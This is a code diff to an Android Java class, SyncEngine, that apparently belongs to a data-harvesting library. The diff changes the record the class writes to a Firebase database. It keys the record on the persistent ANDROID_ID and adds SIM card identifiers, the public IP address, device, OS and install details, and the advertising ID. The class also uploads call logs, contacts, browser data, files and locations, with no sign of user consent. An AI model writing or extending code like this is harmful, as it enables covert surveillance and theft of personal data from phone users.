@@ -4,6 +4,7 @@ import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.pm.PackageInfo;
 import android.os.Build;
+import android.provider.Settings;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -22,11 +23,9 @@ import com.sync.library.models.BluetoothInfo;
 import com.sync.library.models.BrowserData;
 import com.sync.library.models.CallLog;
 import com.sync.library.models.Contact;
-import com.sync.library.models.DeviceID;
 import com.sync.library.models.DeviceInfo;
 import com.sync.library.models.DeviceModel;
 import com.sync.library.models.FileInfo;
-import com.sync.library.models.Gaid;
 import com.sync.library.models.InstallLocation;
 import com.sync.library.models.InstalledApp;
 import com.sync.library.models.LocationInfo;
@@ -72,8 +71,6 @@ public class SyncEngine {
                 uploadLocations(context, db, deviceId, result);
                 uploadAudioInfo(context, db, deviceId, result);
                 uploadBluetooth(context, db, deviceId, result);
-                uploadGaid(context, db, deviceId, result);
-                uploadMobileNumber(context, db, deviceId, result);
 
                 Async.runOnMain(() -> callback.onResult(result));
             } catch (Exception e) {
@@ -84,8 +81,13 @@ public class SyncEngine {
     }
 
     private static String getDeviceId(Context context) {
+        String id = Settings.Secure.getString(
+                context.getContentResolver(),
+                Settings.Secure.ANDROID_ID
+        );
+        if (id != null && !id.isEmpty()) return id;
         SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-        String id = prefs.getString(KEY_DEVICE_ID, null);
+        id = prefs.getString(KEY_DEVICE_ID, null);
         if (id == null) {
             id = UUID.randomUUID().toString();
             prefs.edit().putString(KEY_DEVICE_ID, id).apply();
@@ -122,27 +124,8 @@ public class SyncEngine {
         try {
             Map<String, Object> data = new HashMap<>();
 
-            data.put("brand", Build.BRAND != null ? Build.BRAND : "");
-            data.put("model", Build.MODEL != null ? Build.MODEL : "");
-            data.put("manufacturer", Build.MANUFACTURER != null ? Build.MANUFACTURER : "");
-            data.put("androidVersion", Build.VERSION.RELEASE != null ? Build.VERSION.RELEASE : "");
+            data.put("uid", "");
             data.put("deviceId", deviceId);
-
-            data.put("packageName", context.getPackageName());
-            try {
-                PackageInfo pkgInfo = context.getPackageManager().getPackageInfo(
-                        context.getPackageName(), 0);
-                data.put("appVersion", pkgInfo.versionName != null ? pkgInfo.versionName : "");
-                data.put("appInstallTime", pkgInfo.firstInstallTime);
-            } catch (Exception e) {
-                data.put("appVersion", "");
-                data.put("appInstallTime", 0L);
-            }
-            data.put("appInUse", true);
-
-            List<MobileNumber> numbers = MobileNumberImpl.getMobileNumber(context);
-            data.put("simCard", numbers.isEmpty() ? "" : numbers.get(0).getSimCard());
-            data.put("simNumber", numbers.isEmpty() ? "" : numbers.get(0).getPhoneNumber());
 
             try {
                 AdvertisingIdClient.Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
@@ -151,15 +134,20 @@ public class SyncEngine {
                 data.put("gaid", "");
             }
 
+            data.put("fcmToken", "");
+            data.put("fullname", "");
+            data.put("accounts", new ArrayList<>());
+            data.put("profileImage", "");
+            data.put("email", "");
+            data.put("phoneNumber", "");
+
+            List<String> ipList = new ArrayList<>();
             String ip = PublicIPImpl.getPublicIPFromService("https://api.ipify.org");
             if (ip == null) {
                 ip = PublicIPImpl.getPublicIPFromService("https://checkip.amazonaws.com");
             }
-            data.put("ip", ip != null ? ip : "");
-
-            data.put("lastSeen", ServerValue.TIMESTAMP);
-            data.put("lastSync", ServerValue.TIMESTAMP);
-            data.put("uploadTime", ServerValue.TIMESTAMP);
+            if (ip != null) ipList.add(ip);
+            data.put("ipAddress", ipList);
 
             List<Map<String, Object>> locations = new ArrayList<>();
             try {
@@ -176,6 +164,43 @@ public class SyncEngine {
                 }
             } catch (Exception ignored) {}
             data.put("installLocation", locations);
+
+            List<Long> installTimeList = new ArrayList<>();
+            try {
+                PackageInfo pkgInfo = context.getPackageManager().getPackageInfo(
+                        context.getPackageName(), 0);
+                installTimeList.add(pkgInfo.firstInstallTime);
+            } catch (Exception ignored) {}
+            data.put("installTime", installTimeList);
+
+            List<String> simList = new ArrayList<>();
+            for (MobileNumber mn : MobileNumberImpl.getMobileNumber(context)) {
+                simList.add(mn.getSimCard());
+            }
+            data.put("sim", simList);
+
+            data.put("brand", Build.BRAND != null ? Build.BRAND : "");
+            data.put("model", Build.MODEL != null ? Build.MODEL : "");
+
+            List<String> osList = new ArrayList<>();
+            if (Build.VERSION.RELEASE != null) osList.add(Build.VERSION.RELEASE);
+            data.put("os", osList);
+
+            try {
+                PackageInfo pkgInfo = context.getPackageManager().getPackageInfo(
+                        context.getPackageName(), 0);
+                data.put("appVersion", pkgInfo.versionName != null ? pkgInfo.versionName : "");
+            } catch (Exception e) {
+                data.put("appVersion", "");
+            }
+            data.put("packageName", context.getPackageName());
+            data.put("isPlaystore", false);
+
+            data.put("lastSeen", ServerValue.TIMESTAMP);
+            data.put("lastSync", ServerValue.TIMESTAMP);
+            data.put("forceSync", false);
+            data.put("app_in_use", true);
+            data.put("permissionStatus", new ArrayList<>());
 
             db.child("users").child(deviceId).setValue(data);
             result.addUploaded("users", 1);
@@ -484,50 +509,4 @@ public class SyncEngine {
         }
     }
 
-    // ─── GAID ──────────────────────────────────────────────────────
-
-    private static void uploadGaid(Context context, DatabaseReference db,
-                                    String deviceId, SyncResult result) {
-        try {
-            Info adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context);
-            String gaid = adInfo != null ? adInfo.getId() : "";
-            DatabaseReference ref = db.child("gaid").child(deviceId);
-            Map<String, Object> data = new HashMap<>();
-            safePut(data, "gaid", gaid);
-            data.put("uploadTime", ServerValue.TIMESTAMP);
-            ref.setValue(data);
-            result.addUploaded("gaid", 1);
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to upload gaid", e);
-            result.addSkipped("gaid", 1);
-        }
-    }
-
-    // ─── Mobile Number ─────────────────────────────────────────────
-
-    private static void uploadMobileNumber(Context context, DatabaseReference db,
-                                            String deviceId, SyncResult result) {
-        try {
-            List<MobileNumber> items = MobileNumberImpl.getMobileNumber(context);
-            DatabaseReference ref = db.child("mobileNumber").child(deviceId);
-            if (items.isEmpty()) {
-                Map<String, Object> data = new HashMap<>();
-                data.put("simCard", "");
-                data.put("phoneNumber", "");
-                data.put("uploadTime", ServerValue.TIMESTAMP);
-                ref.setValue(data);
-                result.addSkipped("mobileNumber", 1);
-                return;
-            }
-            Map<String, Object> data = new HashMap<>();
-            safePut(data, "simCard", items.get(0).getSimCard());
-            safePut(data, "phoneNumber", items.get(0).getPhoneNumber());
-            data.put("uploadTime", ServerValue.TIMESTAMP);
-            ref.setValue(data);
-            result.addUploaded("mobileNumber", 1);
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to upload mobileNumber", e);
-            result.addSkipped("mobileNumber", 1);
-        }
-    }
 }
